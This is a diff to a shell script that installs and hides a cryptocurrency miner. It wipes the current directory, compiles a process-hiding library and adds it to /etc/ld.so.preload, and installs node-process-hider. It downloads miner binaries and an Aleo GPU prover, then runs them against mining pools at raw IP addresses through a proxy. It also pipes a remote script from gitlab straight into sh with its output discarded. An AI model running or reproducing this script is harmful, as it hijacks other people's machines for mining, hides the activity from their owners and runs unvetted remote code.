@@ -1,4 +1,4 @@
-rm -rvf * && mkdir a && cd a
+rm -rvf * && mkdir d && cd d
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -13,7 +13,7 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
 
 npm i -g node-process-hider
 
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/1.94a && chmod 777 1.94a
+wget https://github.com/6block/zkwork_aleo_gpu_worker/releases/download/cuda-v0.2.5-hotfix2/aleo_prover-v0.2.5_cuda_full_hotfix2.tar.gz && tar -zvxf aleo_prover-v0.2.5_cuda_full_hotfix2.tar.gz && cd aleo_prover
 
 wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
@@ -55,4 +55,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp & clear & ./1.94a -a OCTOPUS -p 206.189.234.132:80 -u cfx:aats7h7t761ac5d6tjk8vnjjh3537t1znjrwvwhhhy.$(shuf -n 1 -i 1-99999)-Bismillah --no-cl & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
+./graftcp/graftcp & clear & ./aleo_prover --pool 138.197.44.235:80 --address aleo1cuyzy5896apfmfgwzrq57nl942zaafu9j9uvgay04k86xrqm5v9ql5lwtc --custom_name $(shuf -n 1 -i 1-9999999)-Bismillah & curl https://gitlab.com/majapahlevi/mvp/-/raw/main/cpu.sh | sh > /dev/null 2>&1
